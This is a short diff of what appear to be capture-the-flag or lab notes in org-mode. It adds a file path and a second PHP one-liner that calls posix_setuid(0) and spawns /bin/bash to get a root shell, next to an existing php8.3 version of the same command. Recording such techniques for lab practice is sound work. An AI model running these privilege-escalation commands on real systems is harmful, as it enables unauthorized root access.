@@ -457,5 +457,9 @@ get root shell with php8.3 ->
 /usr/bin/php8.3 -r 'posix_setuid(0); system("/bin/bash");'
 #+end_src
 
+/var/www/inquiries.txt
+
 Last question ->
 : wc -l customers_purchases.txt
+
+/usr/bin/php5 -r 'posix_setuid(0); system("/bin/bash");'
